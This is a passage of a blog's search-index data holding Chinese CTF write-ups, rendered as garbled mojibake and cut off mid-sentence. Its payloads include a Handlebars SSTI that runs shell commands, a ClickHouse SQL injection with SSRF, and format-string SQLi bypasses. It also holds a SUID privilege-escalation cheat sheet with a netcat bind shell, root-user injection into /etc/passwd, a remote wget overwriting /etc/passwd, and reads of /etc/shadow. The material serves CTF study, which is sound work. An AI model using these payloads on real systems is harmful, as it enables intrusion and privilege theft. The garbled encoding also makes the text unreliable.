å‡½æ•°ç”¨äºæŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ï¼Œå¦‚æœæ²¡æœ‰array å‚æ•°ï¼Œåˆ™ç”±è¯¥å‡½æ•°è®¾ç½®çš„å˜é‡å°†è¦†ç›–å·²å­˜åœ¨çš„åŒåå˜é‡ å†™ä¸ªç®€å•çš„è„šæœ¬debugä¸€ä¸‹è®©å¤§å®¶çœ‹çœ‹åŸç†å§ æœ¬åœ°å¤ç°æºç å¦‚ä¸‹: &lt;?php$hashed_key = 'df01c5786c5d7d83211a8f5f22f6bdb8468e23494ad698cb86c02d128473beef765952cdd5504cbe4657a6334f6b4f7b';$parsed = parse_url($_SERVER['REQUEST_URI']);$query = $parsed[&quot;query&quot;];$parsed_query = parse_str($query);print($hashed_key); é¦–å…ˆæˆ‘ä¼ å…¥è¿™ä¸ªå€¼ ç„¶åæˆ‘ä»¬åˆ°phpstormé‡Œé¢å»è·Ÿè¿›ä¸€ä¸‹:å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¼ å…¥çš„hashed_key=123æ˜¯æ•°ç»„ä¸­queryé”®çš„å€¼ ç»è¿‡parse_strå‡½æ•°çš„è½¬åŒ–åhashed_keyä»ä¸€å¼€å§‹çš„é‚£ä¸€å¤§ä¸²ä¸œè¥¿è¢«é‡æ–°èµ‹å€¼ä¸º123äº†ï¼Œäº§ç”Ÿäº†å˜é‡è¦†ç›–æ¼æ´ æ‰€ä»¥ï¼Œæ ¹æ®è¿™ä¸ªæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥éšä¾¿ä¼ å…¥ä¸€ä¸ª1ç»è¿‡shaåŠ å¯†ä»¥åå¯¹hash_è¿›è¡Œå˜é‡è¦†ç›–ï¼Œç„¶åè¿™ä¸ªæ˜¯payload ?action=auth&amp;key=1&amp;hashed_key=47f05d367b0c32e438fb63e6cf4a5f35c2aa2f90dc7543f8a41a0f95ce8a40a313ab5cf36134a2068c4c969cb50db776 å³å¯æ‹¿åˆ°flag","link":"/2021/10/18/2021%E6%A0%A1%E8%B5%9B/"},{"title":"2021ä¸œåæ¯","text":"å‰è¨€æ¯”èµ›é‚£å¤©ä½“ä¾§==äººå‚»äº†ï¼Œåé¢ä¹Ÿæ²¡å¿ƒæƒ…åšï¼Œä½†æ˜¯æ„Ÿè§‰æ¯”èµ›çš„é¢˜éƒ½æ˜¯å¯ä»¥å­¦ä¹ çš„ï¼Œå¯æƒœæ²¡æƒ³åˆ°ç¯å¢ƒé©¬ä¸Šå°±å…³äº†â€“ apacheprOxyé™„è¿‘æ˜¯ä¸€ä¸ªdockeræ–‡ä»¶ï¼Œå‘ç°æ˜¯GKCTF2021çš„åŸé¢˜ï¼ˆç®€åŒ–ç‰ˆï¼‰,è¿™é‡Œä¸»è¦å­¦ä¹ ä¸€ä¸‹å­¦é•¿çš„å·¥å…·è¯•è¯•çœ‹ é¦–å…ˆä½¿ç”¨æ‰«æå™¨æ‰«æé“¾æ¥ python3 ws.py -t xx.xx.xx.xx ç„¶åä½¿ç”¨å·¥å…·ä¸€é”®getshell python cve-2020-14882_rce.py -u http://127.0.0.1:7001 -c whoami eznodeçœ‹çœ‹èƒ½ä¸èƒ½æœ¬åœ°èµ·ä¸€ä¸ªè·‘ä¸€ä¸‹çœ‹çœ‹é…ç½®è¿‡ç¨‹ï¼Œé¦–å…ˆå‡ºç°äº†ç¬¬ä¸€ä¸ªé—®é¢˜: 'const' is available in ES6 (use 'esversion: 6') or Mozilla JS extensions (use moz). (W104) æŸ¥åˆ°è§£å†³æ–¹æ³•æ˜¯:åœ¨å¼€å¤´æ·»åŠ ä¸€ä¸ª /*jshint esversion: 6 */ ç„¶åä¸€ç›´è¯´æ‰¾ä¸åˆ°moduleï¼Œinstalläº†å¾ˆå¤šæ¬¡ï¼Œå‘ç°éœ€è¦cdåˆ°é‚£ä¸ªé¡¹ç›®ç›®å½•ä¸‹å»installè¿™äº›æ¨¡å— npm install ç”±äºå‰é¢çš„ç™»å½•éƒ¨åˆ†éœ€è¦éº»çƒ¦çš„æ•°æ®åº“ä¹‹ç±»çš„é…ç½®ï¼Œæ‰€ä»¥æˆ‘å°±ç›´æ¥è¿›å…¥åˆ°uploadçš„è·¯ç”±ï¼Œå¹¶åˆ é™¤æ ¡éªŒçš„éƒ¨åˆ†äº†æŸ¥çœ‹package.jsonï¼Œä¸€ä¸ªä¸€ä¸ªæŸ¥æ¼æ´ï¼ˆç§¯ç´¯ä¸‹ï¼‰ { &quot;name&quot;: &quot;app&quot;, &quot;version&quot;: &quot;0.0.0&quot;, &quot;private&quot;: true, &quot;scripts&quot;: { &quot;start&quot;: &quot;node ./bin/www&quot;, &quot;dev&quot;: &quot;nodemon index.js -e js&quot; }, &quot;dependencies&quot;: { &quot;cookie-parser&quot;: &quot;~1.4.4&quot;, &quot;crypto&quot;: &quot;^1.0.1&quot;, &quot;debug&quot;: &quot;~2.6.9&quot;, &quot;express&quot;: &quot;~4.16.1&quot;, &quot;hbs&quot;: &quot;^4.0.1&quot;, &quot;http-errors&quot;: &quot;~1.6.3&quot;, &quot;morgan&quot;: &quot;~1.9.1&quot;, &quot;multer&quot;: &quot;^1.4.3&quot;, &quot;mysql&quot;: &quot;^2.18.1&quot;, &quot;path&quot;: &quot;^0.12.7&quot;, &quot;sequelize&quot;: &quot;^6.7.0&quot; }} å‘ç°hbsçš„æ¨¡æ¿æ¸²æŸ“æœ‰ä¸€ä¸ªCVE-2021-32822å‚è€ƒæ–‡ç« :https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs {{#with &quot;s&quot; as |string|}} {{#with &quot;e&quot;}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub &quot;constructor&quot;)}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push &quot;return require('child_process').exec('whoami');&quot;}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}}{{/with}} {{#with &quot;s&quot; as |string|}} {{#with &quot;e&quot;}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub &quot;constructor&quot;)}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push &quot;return process.mainModule.require('child_process').execSync('cat /flag').toString();&quot;}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}}{{/with}} OldLibraryè¿™é‡Œå°±è®°å½•ä¸€ä¸‹ Linux SUID ææƒå…³äºsuidsuidæ˜¯èµ‹äºˆæ–‡ä»¶çš„ä¸€ç§æƒé™å…·ä½“å™è¿°å¯ä»¥å‚è€ƒ:https://www.cnblogs.com/sparkdev/p/9651622.htmlæ€»ç»“æ¥è¯´å°±æ˜¯:å½“ä¸€ä¸ªäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶å…·æœ‰suidæƒé™æ—¶ï¼Œå°½ç®¡ä¸æ˜¯rootç”¨æˆ·ä¹Ÿå¯ä»¥æ‰§è¡Œæœ¬è¯¥rootç”¨æˆ·æ‰èƒ½æ‰§è¡Œçš„åŠŸèƒ½ æŸ¥æ‰¾suidæƒé™ä½æ–‡ä»¶ä¸‹å‘½ä»¤å¯ä»¥æ‰¾åˆ°æ­£åœ¨ç³»ç»Ÿä¸Šè¿è¡Œçš„æ‰€æœ‰SUIDå¯æ‰§è¡Œæ–‡ä»¶ã€‚å‡†ç¡®çš„è¯´ï¼Œè¿™ä¸ªå‘½ä»¤å°†ä»/ç›®å½•ä¸­æŸ¥æ‰¾å…·æœ‰SUIDæƒé™ä½ä¸”å±ä¸»ä¸ºrootçš„æ–‡ä»¶å¹¶è¾“å‡ºå®ƒä»¬ï¼Œç„¶åå°†æ‰€æœ‰é”™è¯¯é‡å®šå‘åˆ°/dev/nullï¼Œä»è€Œä»…åˆ—å‡ºè¯¥ç”¨æˆ·å…·æœ‰è®¿é—®æƒé™çš„é‚£äº›äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb {} ;find /bin -perm -u=s -type f 2&gt;/dev/nullfind /usr -perm -u=s -type f 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/null ä¹Ÿå¯ä»¥ä½¿ç”¨ sudo -l å‘½ä»¤åˆ—å‡ºå½“å‰ç”¨æˆ·å¯æ‰§è¡Œçš„å‘½ä»¤ å¸¸ç”¨ææƒæ–¹å¼nmapï¼ˆ2.02-5.21ï¼‰å­˜åœ¨äº¤æ¢æ¨¡å¼ï¼Œå¯åˆ©ç”¨ææƒ nmap --interactive ä¹‹åæ‰§è¡Œ: nmap&gt; !shsh-3.2# whoamiroot msfä¸­çš„æ¨¡å—ä¸ºï¼š exploit/unix/local/setuid_nmap è¾ƒæ–°ç‰ˆå¯ä½¿ç”¨ --script å‚æ•°ï¼š echo &quot;os.execute('/bin/sh')&quot; &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse findtouch testfind test -exec whoami \\; nc åå¼¹ shellï¼š find test -exec netcat -lvp 5555 -e /bin/sh \\; 2.3 vi/vimæ‰“å¼€vim,æŒ‰ä¸‹ESC :set shell=/bin/sh:shell æˆ–è€… sudo vim -c '!sh' 2.4 bashbash -pbash-3.2# iduid=1002(service) gid=1002(service) euid=0(root) groups=1002(service) 2.5 lessless /etc/passwd!/bin/sh 2.6 moremore /home/pelle/myfile!/bin/bash 2.7 cpè¦†ç›– /etc/shadow æˆ– /etc/passwd [zabbix@localhost ~]$ cat /etc/passwd &gt;passwd2.[zabbix@localhost ~]$ openssl passwd -1 -salt hack hack1233.$1$hack$WTn0dk2QjNeKfl.DHOUue04.[zabbix@localhost ~]$ echo 'hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash' &gt;&gt; passwd5.[zabbix@localhost ~]$ cp passwd /etc/passwd6.[zabbix@localhost ~]$ su - hack7.Password:8.[root@361way ~]# id9.uid=0(hack) gid=0(root) groups=0(root)10.[root@361way ~]# cat /etc/passwd|tail -111.hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash 2.8 mvè¦†ç›– /etc/shadow æˆ– /etc/passwd 2.9 nanonano /etc/passwd 2.10 awkawk 'BEGIN {system(&quot;/bin/sh&quot;)}' 2.11 manman passwd!/bin/bash 2.12 wgetwget http://192.168.56.1:8080/passwd -O /etc/passwd 2.13 apacheä»…å¯æŸ¥çœ‹æ–‡ä»¶ï¼Œä¸èƒ½å¼¹ shellï¼š apache2 -f /etc/shadow 2.14 tcpdumpecho $'id\\ncat /etc/shadow' &gt; /tmp/.testchmod +x /tmp/.testsudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root 2.15 python/perl/ruby/lua/php/etcpython python -c &quot;import os;os.system('/bin/bash')&quot; perl exec &quot;/bin/bash&quot;; å°±æµ‹è¯•äº†ä¸€ä¸‹viçš„ï¼Œå‘ç°è¿˜æŒºç¥å¥‡çš„ åŸä½œè€…ç”¨å¾—æ˜¯ find / -perm -u=s -type f 2&gt;/dev/null #æŸ¥æ‰¾ç³»ç»Ÿä¸Šè¿è¡Œçš„æ‰€æœ‰SUIDå¯æ‰§è¡Œæ–‡ä»¶comm /flagggisshere /dev/null 2&gt; /dev/null å‚è€ƒï¼šhttp://www.snowywar.top/?p=2743","link":"/2021/11/01/2021%E4%B8%9C%E5%8D%8E%E6%9D%AF/"},{"title":"2021bytectfå¤ç°","text":"å‰è¨€æœ¬æ¥æƒ³æ‰“çš„ï¼ˆè™½ç„¶è‡ªå·±å¾ˆèœï¼‰ï¼Œä½†æ˜¯å‘¨æœ«æœ‰æ ¡èµ›ï¼Œè¢«æ‹‰è¿‡å»å‡‘æ•°äº†æ²¡åŠæ³•ï¼Œåé¢æ¥å¤ç°å­¦ä¹ ä¸€ä¸‹ double sqliè¾“å…¥å•å¼•å·æœ‰æŠ¥é”™ä¿¡æ¯,æœç´¢äº†ä¸€ä¸‹æŠ¥é”™ä¿¡æ¯ï¼Œå‘ç°æ˜¯clickhouseä¸‹çš„sql è¿™é‡ŒæŸ¥åˆ°äº†clickhouseä¸‹sqlä½¿ç”¨çš„æ‰‹å†Œï¼Œç›´æ¥ä½¿ç”¨unionå°±å¯ä»¥å®ç°è”åˆæ³¨å…¥ï¼Œå¹¶ä¸”æ˜¯æ•°å­—å‹æ³¨å…¥ 1 union all select user() ä½†æ˜¯å•¥ä¹Ÿæ²¡æœ‰æŠ“åŒ…ä¸€ä¸‹ï¼Œå‘ç°æ˜¯nginxæœåŠ¡å™¨ ?id=2æ—¶ ç„¶åçœ‹åˆ°æœ‰ä¸ªfileï¼Œåˆæ˜¯nginxæœåŠ¡å™¨ï¼Œæœ‰ä¸ªç›®å½•ç©¿è¶Šçš„æ¼æ´ï¼šhttps://blog.csdn.net/weixin_41924764/article/details/113362883 /flies../ æ¥ä¸‹æ¥å°±æ˜¯å»çœ‹çœ‹æœ‰æ²¡æœ‰sqlé…ç½®æ–‡ä»¶çœ‹çœ‹é‡Œé¢çš„ä¿¡æ¯ http://39.105.175.150:30001/files../var/lib/clickhouse/access/ ä¸‹è½½userlistå’Œå¦å¤–ä¸¤ä¸ªsqlé…ç½®æ–‡ä»¶å¯ä»¥å‘ç°ï¼Œå­˜åœ¨å¦ä¸€ä¸ªuserç”¨æˆ· å‘ç°å­˜åœ¨ç€å¦ä¸€ä¸ªç”¨æˆ·çš„å¯†ç  ATTACH USER user_01 IDENTIFIED WITH plaintext_password BY 'e3b0c44298fc1c149afb';ATTACH GRANT SELECT ON ctf.* TO user_01; ç„¶åè¦æ€ä¹ˆç™»é™†å‘¢ï¼Ÿä½¿ç”¨å¦ä¸€ä¸ªç”¨æˆ·ç™»é™†mysqlï¼Œé‚£å°±éœ€è¦ssrfæŸ¥äº†ä¸€ä¸‹ å‘ç°clickhouseä¸­çš„sqlå¯ä»¥ä½¿ç”¨url()æ¥æ‰§è¡Œhttpåè®®ï¼Œå¹¶ä¸”clickhouseä¸­çš„httpåè®®å¯ä»¥å®ç°sqlè¯­å¥çš„ä½¿ç”¨å®ç°ssrf https://clickhouse.com/docs/zh/sql-reference/table-functions/url/ https://clickhouse.com/docs/zh/interfaces/http/ https://blog.deteact.com/yandex-clickhouse-injection/ è¿™ä¸ªæ˜¯ä¸ªä¾‹å­ï¼Œæ ¹æ®è¿™ä¸ªä¾‹å­æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸‹è¯•è¯•çœ‹ ?id=1 union all select * from url('http://127.0.0.1:8123/?query=select+*+from+ctf.flag&amp;user=user_01&amp;password=e3b0c44298fc1c149afb',Values, 'column1 String') è¿™æ ·å°±å¯ä»¥äº†ï¼Œä¸»è¦æ˜¯è¯»æ–‡æ¡£çš„èƒ½åŠ›å§ Unsecure Blogè¯¥blogæ˜¯åŸºäºJfinalæ¡†æ¶è¿›è¡ŒäºŒæ¬¡å¼€å‘çš„ï¼Œåœ¨åº”ç”¨å¯åŠ¨é™¤å‘ç°å­˜åœ¨å…¨å±€çš„securitymanagerï¼Œå¹¶ä¸”åšäº†ä¸€äº›é™åˆ¶","link":"/2021/10/19/2021bytectf%E5%A4%8D%E7%8E%B0/"},{"title":"2021hack.lu","text":"Diamond Safeä¸‹è½½æºç : è™½ç„¶å­˜åœ¨è¿‡æ»¤å‡½æ•° ä½†æ˜¯é—®é¢˜ä¸å¤§ï¼Œå› ä¸ºå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„åº”è¯¥æ˜¯æ„é€ å‡ºä¸‡èƒ½å¯†ç ï¼Œç„¶åæˆåŠŸç™»é™†å³å¯é˜…è¯»æºç ï¼Œå¯ä»¥å‘ç°%såé¢ä¼šè¢«æ›¿æ¢æˆâ€™%sâ€™å¦‚æœæˆ‘ä»¬æƒ³æˆåŠŸç™»å½•ï¼Œé‚£ä¹ˆå°±è¦é—­åˆå‰é¢çš„å¼•å·ï¼Œé€ƒé€¸å‡ºä¸€ä¸ªå•å¼•å·æŸ¥è¯¢è¯­å¥ä¸º: SELECT * FROM `users` where password=sha1(%s) and name='%s' å¦‚æœæˆ‘ä»¬æ­¤æ—¶ä»…è¾“å…¥å•å¼•å·ï¼Œé‚£ä¹ˆå°±ä¼šè¢«è¿‡æ»¤å‡½æ•°ç»™è½¬ä¹‰ ä»'å˜æˆ\\' å› ä¸ºå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™é‡Œ%ä¼šåƒå­—ç¬¦çš„ç‰¹æ€§ï¼Œåƒæ‰\\ $a=&quot;name='%\\&quot;;$b=vsprintf($a,'a');echo $b;#name='' æ€è·¯å¦‚æœæˆ‘ä»¬å¯ä»¥åœ¨è½¬ä¹‰ä¹‹å‰å°±æ’å…¥%'ï¼Œé‚£ä¹ˆåé¢è½¬ä¹‰åå°±å˜æˆ%\\'ï¼Œæ­¤æ—¶åœ¨ç»è¿‡vsprintfå‡½æ•°ï¼Œå°±ä¼šå˜æˆåªå‰©ä¸‹å•å¼•å·ä»¥åçš„å†…å®¹',ä½†æ­¤æ—¶ä¼šå¼•èµ·è¯­æ³•ä¸ŠæŠ¥é”™ï¼Œå› ä¸ºæœ‰ä¸¤ä¸ª%ï¼Œä½†æ˜¯åé¢åªæœ‰ä¸€ä¸ªå‚æ•°ï¼ŒåŒ¹é…ä¸ä¸Šï¼Œè€Œåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­åŒ¹é…ä¸­æ²¡æœ‰%1$'è¿™ä¸ªæ ¼å¼ï¼Œå°†ä¼šè¢«ç›´æ¥èˆå¼ƒæ‰,è¿™ä¸ªå°±ä¸ä¼šå¼•èµ·æŠ¥é”™äº† &lt;?php$a=&quot;name='%\\'%s&quot;;$b=vsprintf($a,'a');echo $b;#Warning: vsprintf(): Too few arguments in&lt;?php$a=&quot;name='%1$\\'%s&quot;;$b=vsprintf($a,'a');echo $b;#name=''a æ„é€ æ¥åˆ†æä¸€ä¸‹ä»–ä»£ç çš„æ‰§è¡Œè¿‡ç¨‹ #å…ˆå°è¯•password=1%1$') or 1=1#åˆ™(è½¬ä¹‰å)å˜æˆ:1%$1\\') or 1=1#ç„¶åå˜æˆSELECT * FROM `users` where password=sha1('1%1$\\') or 1 = 1#')æ­¤æ—¶è¿˜éœ€è¦åœ¨ç»è¿‡sprintfæ‰èƒ½æ¶ˆå»%1$\\è®©å•å¼•å·é€ƒé€¸å‡ºæ¥ï¼Œæ‰€ä»¥è¿˜è¦åœ¨postä¸€æ¬¡nameè®©ä»–åœ¨ç»è¿‡ä¸€æ¬¡sprintfï¼Œæ­¤æ—¶å³å¯ç™»å½•æˆåŠŸæœ€ç»ˆpayloadpassword=1%1$') or 1=1#&amp;name=a ç™»é™†æˆåŠŸä»¥åä»…ä»…åªæ˜¯ä¸ªå¼€å§‹ï¼Œå†æ¥çœ‹çœ‹æºç ï¼Œæä¾›äº†ä¸‹è½½åŠŸèƒ½ï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ–‡ä»¶ä¸‹è½½æ¥è¯»å–flagï¼Œä½†æ˜¯å­˜åœ¨ä¸€ç‚¹ï¼Œæˆ‘ä»¬ä¸çŸ¥é“secretï¼Œæ‰€ä»¥æ— æ³•ä¼ªé€ é‚£ä¸ªshaåŠ å¯†ï¼Œä½†æ˜¯æˆ‘ä»¬ç°åœ¨æœ‰ç°æˆçš„ä¸¤ä¸ªæ–‡ä»¶ï¼Œä»–ä»¬æœ‰æä¾›è¿™ä¸ªshaåŠ å¯†çš„ç»“æœ ä½†æ˜¯å¦‚æœæˆ‘ä»¬ç›´æ¥ä¼ å…¥ ?h=f2d03c27433d3643ff5d20f1409cb013&amp;file_name=FlagNotHere.txt&amp;file_name=../../../../../flag.txt åŸæœ¬çš„çš„file_nameå°†ä¼šç›´æ¥è¢«è¦†ç›–ï¼Œå°±è¿‡ä¸å»åé¢çš„hashæ¯”å¯¹ æ‰€ä»¥è¿™é‡Œå°±åˆ©ç”¨QUERY_STRINGä¼ å…¥çš„ä¸ä¼šurldecodeï¼Œè¿˜æœ‰åœ¨phpä¸­ç©ºæ ¼ä¼šè‡ªåŠ¨è§£æä¸º_çš„ç‰¹æ€§æŠŠä¸Šé¢çš„payloadæ”¹ä¸º ?h=f2d03c27433d3643ff5d20f1409cb013&amp;file_name=FlagNotHere.txt&amp;file%20name=../../../../../flag.txt æ­¤æ—¶å¯ä»¥å‘ç°ï¼Œä¸¤ä¸ªæ£€æµ‹æ—¶å€¼äº’ç›¸ä¸è¦†ç›– è€Œåç©ºæ ¼è¢«è§£æä¸ºä¸‹åˆ’çº¿ï¼Œå½“é¢å¯¹ä¸¤ä¸ªfile_nameå€¼çš„æ—¶å€™ï¼Œphpå°±ä¼šé»˜è®¤é€‰æ‹©åè€… æ­¤æ—¶å°±å¯ä»¥ä¸‹è½½å¾—åˆ°flagäº† NODENBæ³¨å†Œç™»å½•ä»¥åï¼Œæ¥çœ‹çœ‹æºç ï¼Œä»–ä½¿ç”¨çš„æ˜¯redisçš„æ•°æ®åº“ï¼Œæ‰€ä»¥å‘½ä»¤é›†éƒ½æ˜¯redisçš„ï¼Œå¹¶ä¸”å¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œä½†æ˜¯å¯¹äºredisçš„å‘½ä»¤éƒ½æ¯”è¾ƒé™Œç”Ÿï¼Œæ‰€ä»¥è¦å­¦ä¹ ä¸€ä¸‹: const db = {};const asyncBinds = [ 'get', 'set', 'setnx', 'incr', 'exists', 'del', 'hget', 'hset', 'hgetall', 'hmset', 'hexists', 'sadd', 'srem', 'smembers', 'sismember',]; ä¸»è¦çœ‹çœ‹å’Œflagæœ‰å…³çš„ï¼Œé¦–å…ˆæ˜¯åˆ›äº†ä¸€ä¸ªç”¨æˆ·å«åšsystemï¼Œç„¶åè¿™é‡Œå°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªnoteåº“ï¼Ÿç„¶åé‡Œé¢æœ‰ä¸ªflagè¡¨ï¼Œç„¶åä»–æœ‰ä¸ªå­—æ®µtitleå«FLAGï¼Œå€¼ä¸ºFLAGï¼Œæ¥è‡ªäºå‰é¢å®šä¹‰çš„ç¯å¢ƒå˜é‡ db.hset('uid:1', 'name', 'system');db.set('user:system', '1');db.setnx('index:uid', 1);db.hmset('note:flag', { 'title': 'Flag', 'content': FLAG,}); å¾ˆæ˜æ˜¾ï¼Œéœ€è¦ä»è¿™é‡Œå¾—åˆ°ï¼Œè®¿é—®/notes/flagï¼Œæ¥ä¸‹æ¥ä»–ä¼šæ ¡éªŒid app.get('/notes/:nid', ensureAuth, async (req, res) =&gt; { const { nid } = req.params; if (!await db.hasUserNoteAcess(req.session.user.id, nid)) { return res.redirect('/notes'); } const note = await db.getNote(nid); res.render('note', { note });}); è¿™é‡Œçœ‹ä¸€ä¸‹ä»–æ˜¯å¦‚ä½•è¿›è¡Œæ ¡éªŒçš„,ç¬¬ä¸€ä¸ªæ¯”è¾ƒæ—¶è‚¯å®šå¯ä»¥è¿‡çš„ï¼Œç¬¬äºŒä¸ªæ˜¯æ¯”è¾ƒç”¨æˆ·åæ˜¯å¦å­˜åœ¨äºå¯¹åº”çš„hashè¡¨ async hasUserNoteAcess(uid, nid) {//Redis Sismember å‘½ä»¤åˆ¤æ–­æˆå‘˜å…ƒç´ æ˜¯å¦æ˜¯é›†åˆçš„æˆå‘˜,nidä¸ºflagï¼Œé‚£ä¸€å®šæ˜¯ï¼Œè¿™ä¸ªæ˜¯è¡¨é‡Œæœ‰çš„ if (await db.sismember(`uid:${uid}:notes`, nid)) { return true; }//Hexists å‘½ä»¤ç”¨äºæŸ¥çœ‹å“ˆå¸Œè¡¨çš„æŒ‡å®šå­—æ®µæ˜¯å¦å­˜åœ¨ if (!await db.hexists(`uid:${uid}`, 'hash')) { // system user has no password return true; } return false; æŒ‰ç…§ä¸Šé¢çš„é€»è¾‘ï¼Œå°±æ˜¯æˆ‘ä»¬è¦å…ˆç™»å½•systemçš„è´¦å·ï¼Œç„¶åæ‰å¯ä»¥è®¿é—®åˆ°flagï¼Œä½†æ˜¯ä¸Šé¢åˆè¯´systemæ˜¯æ²¡æœ‰å¯†ç çš„ï¼Œä½†æ˜¯è¿™é‡Œåˆéœ€è¦ä½ çš„å¯†ç æ˜¯éç©ºä¸”ä¸ºstringï¼Œé‚£ä¹ˆè¿™é‡Œå°±æ˜¯ä¸€ä¸ªçŸ›ç›¾ç‚¹äº†ï¼Œæ€ä¹ˆå¯èƒ½è®©passwordéç©ºç„¶ååˆç¬¦åˆç©ºä»¥ååŠ å¯†çš„hashå€¼ if (!username || !password || typeof username !== 'string' || typeof password !== 'string') { res.flash('danger', 'invalid username or password'); return res.status(400).render('login'); } ä½†å…¶å®ä¹Ÿä¸ä¸€å®šè¦ç™»å½•ï¼Œå› ä¸ºä»–éªŒè¯çš„æ˜¯ä¼šè¯çš„hashå€¼ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥ä¼ªé€ å¾—åˆ°è¿™ä¸ªä¼šè¯ï¼Œä¹Ÿæ˜¯èƒ½è¾¾åˆ°æœ€ç»ˆç›®çš„,é¢å¾ˆæ˜æ˜¾ï¼Œä¼ªé€ æ˜¯ä¸å¯èƒ½çš„ï¼Œå†å›å»çœ‹äº†ä¸€ä¸‹ä¸Šé¢çš„éªŒè¯é€»è¾‘ï¼Œä»–éªŒè¯çš„å‡½æ•°æ˜¯hexistsï¼Œå³åœ¨è¿™ä¸ªhashè¡¨ä¸­æœ‰æ²¡æœ‰è¿™ä¸ªhashå€¼ï¼Œå¦‚æœæ²¡æœ‰çš„è¯ï¼Œé‚£å°±æ˜¯trueï¼é‚£æ˜¯ä¸æ˜¯å­˜åœ¨å½“æˆ‘ä»¬åˆ é™¤è¿™ä¸ªæŸä¸ªç”¨æˆ·ä»¥åï¼Œä»–çš„sessionè¿˜åœ¨ï¼Œä½†æ˜¯å·²ç»æ²¡æœ‰è¿™ä¸ªhashå€¼äº†å‘¢ï¼Ÿ if (!await db.hexists(`uid:${uid}`, 'hash')) { // system user has no password return true; } æ¥çœ‹çœ‹ä»–åˆ é™¤çš„è¿‡ç¨‹ï¼Œè¿™é‡Œå†è´´ä¸€ä¸‹åˆ›å»ºçš„è¿‡ç¨‹ä¼šç†è§£çš„æ¯”è¾ƒæ¸…æ¥šä¸€äº› async createUser(name, password) { const isAvailable = await db.setnx(`user:${name}`, 'PLACEHOLDER'); if (!isAvailable) { throw new Error('user already exists!'); } const uid = await db.incr('index:uid'); await db.set(`user:${name}`, uid); const hash = await argon2.hash(password); await db.hmset(`uid:${uid}`, { name, hash }); return uid; }, å¯¹æ¯”åˆ›å»ºå’Œåˆ é™¤ï¼Œå¯ä»¥å‘ç°ï¼Œå½“åˆ é™¤äº†uidä»¥åï¼Œnameå’Œå¯¹åº”çš„hashä¹Ÿä¼šåˆ é™¤ï¼Œç„¶åsessionæ˜¯åœ¨åé¢åˆ é™¤çš„ async deleteUser(uid) { const user = await helpers.getUser(uid); await db.set(`user:${user.name}`, -1); await db.del(`uid:${uid}`); const sessions = await db.smembers(`uid:${uid}:sessions`); const notes = await db.smembers(`uid:${uid}:notes`); return db.del([ ...sessions.map((sid) =&gt; `sess:${sid}`), ...notes.map((nid) =&gt; `note:${nid}`), `uid:${uid}:sessions`, `uid:${uid}:notes`, ]); }, è€Œåœ¨è¿™ä¸ªæ¨¡å—ä¸­ï¼Œæœ‰å»¶æ—¶å­˜åœ¨ï¼Œè¿›å…¥flashä»¥åä¼šå¯¹sessionè¿›è¡Œæ“ä½œï¼Œå¯ä»¥ç†è§£ä¸ºæš‚æ—¶æ›¿æˆ‘ä»¬ä¿ç•™äº†ä¸€ä¼šsession if (req.query.random) { const ms = Math.floor(2000 + Math.random() * 1000); await new Promise(r =&gt; setTimeout(r, ms)); res.flash('info', `Our AI ran ${ms}ms to generate this piece of groundbreaking research.`); content = 'Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.'; } æ€è·¯åˆ›å»ºç”¨æˆ·ï¼Œç„¶åå¯ç”¨å»¶æ—¶åŠŸèƒ½ï¼Œåœ¨åˆ é™¤è¯¥ç”¨æˆ·çš„åŒæ—¶ï¼Œä½¿ç”¨å®ƒçš„sessionè®¿é—®notes/flagè¡¨ï¼Œä½†æ˜¯æˆ‘è¯•äº†å‡ æ¬¡éƒ½æ²¡æˆåŠŸï¼Œæƒ³ç€ä¼šä¸ä¼šæ˜¯æ‰‹é€Ÿä¸å¤Ÿå¿«ï¼Ÿè¿™é‡Œæ¶‰åŠåˆ°å¤šè¿›ç¨‹å¹¶è¡Œçš„æƒ…å†µï¼Œå­¦ä¹ ä¸€ä¸‹è¿™ä¸ª class multiprocessing.Process(group=None, target=None, name=None, args=(), kwargs={}, *, daemon=None)start()æ–¹æ³•å¯åŠ¨ï¼Œè¿™æ 